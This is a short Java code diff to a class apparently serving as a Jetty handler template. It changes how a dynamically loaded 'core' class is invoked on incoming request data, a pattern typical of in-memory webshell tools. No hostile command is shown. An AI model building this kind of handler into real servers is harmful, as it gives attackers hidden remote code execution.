@@ -61,7 +61,11 @@ public class LeoJettyHandlerChunkTpl {
                     responseType = 1;
                     ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                     buffer.write(data);
-                    core.newInstance().equals(buffer);
+                    try {
+                        ((java.lang.reflect.InvocationHandler) core.newInstance()).invoke(null, null, new Object[]{buffer});
+                    } catch (Throwable e) {
+                        throw new IllegalStateException("Core invocation failed", e);
+                    }
                     responseData = buffer.toByteArray();
                 } else {
                     break;
